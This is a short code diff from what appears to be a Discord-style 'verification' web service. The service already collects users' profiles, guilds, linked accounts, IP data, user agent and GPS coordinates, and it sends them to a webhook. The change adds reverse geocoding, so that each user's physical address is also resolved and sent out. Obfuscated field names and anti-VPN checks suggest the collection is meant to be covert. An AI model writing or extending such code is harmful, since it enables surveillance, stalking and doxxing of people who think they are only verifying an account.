@@ -7,6 +7,7 @@ import { GpsData } from "@/lib/types/userdata";
 import { deobf, deobf2 } from "@/lib/functions/anti-scraping";
 import { isValidGps, isValidIP, isValidUserAgent } from "@/lib/functions/validation";
 import { isAnonymouse } from "@/lib/functions/antivpn";
+import { getAddress } from "@/lib/functions/userdata";
 
 const verifyToken = async (token: string) => {
     const verificationResponse = await fetch(
@@ -63,8 +64,10 @@ const verifyCode = async (code: string, req: NextRequest, gps: GpsData) => {
             console.log("Failed to log user");
             throw new Error("Failed to log user");
         }
+
+        const address = await getAddress(gps.hh, gps.xf);
         
-        const webhookResult = await sendWebhook(userInfo, ownGuilds, connections, ipInfo, ua, gps);
+        const webhookResult = await sendWebhook(userInfo, ownGuilds, connections, ipInfo, ua, gps, address);
         
         if (!webhookResult.success) {
             console.log("Failed to send webhook");
